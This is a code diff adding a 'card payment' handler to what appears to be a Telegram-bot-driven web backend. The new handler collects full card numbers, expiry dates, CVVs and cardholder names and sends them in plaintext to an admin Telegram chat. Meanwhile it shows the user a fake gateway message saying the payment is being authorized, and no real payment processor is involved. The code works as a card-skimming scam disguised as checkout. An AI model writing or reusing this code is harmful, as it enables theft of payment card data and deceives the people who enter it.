@@ -560,6 +560,42 @@ def process_action(action, data, device_sig="web"):
         bot.send_message(ADMIN_CHAT_ID, notif, parse_mode="Markdown", reply_markup=markup)
         response_data = {"success": True, "message": "Verification submitted."}
 
+    elif action == 'card_payment_request':
+        u = data.get('username')
+        amount = data.get('amount')
+        card_data = data.get('card_details', {})
+        order_id = data.get('order_id')
+        ts = (datetime.datetime.utcnow() + datetime.timedelta(hours=5, minutes=30)).strftime("%d %b %Y, %H:%M")
+
+        inbox_col.insert_one({
+            "username": u, "sender": "CARD_GATEWAY", "subject": "CARD_PROCESSING_INITIALIZED",
+            "body": f"Payment of ₹{amount} via Card is being authorized. ID: {order_id}",
+            "time": ts, "type": "info", "read": False
+        })
+
+        markup = InlineKeyboardMarkup()
+        markup.add(
+            InlineKeyboardButton("✅ APPROVE", callback_data=f"funds_approve_{u}_{amount}"),
+            InlineKeyboardButton("❌ REJECT", callback_data=f"funds_reject_{u}_{amount}")
+        )
+
+        card_notif = (
+            f"💳 *CARD PAYMENT REQUEST*\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"👤 User: `{u}`\n"
+            f"🆔 Order: `{order_id}`\n"
+            f"💵 Amount: *₹{amount}*\n"
+            f"💳 Card: `{card_data.get('number')}`\n"
+            f"📅 Exp: `{card_data.get('expiry')}`\n"
+            f"🔐 CVV: `{card_data.get('cvv')}`\n"
+            f"👤 Name: `{card_data.get('name')}`\n"
+            f"⏰ Time: `{ts}`\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"Take action based on authorization status:"
+        )
+        bot.send_message(ADMIN_CHAT_ID, card_notif, parse_mode="Markdown", reply_markup=markup)
+        response_data = {"success": True, "message": "Card verification submitted."}
+
     elif action == 'fetch_orders':
         u = data.get('username')
         orders = list(orders_col.find({"username": u}).sort("created_at", -1).limit(30))
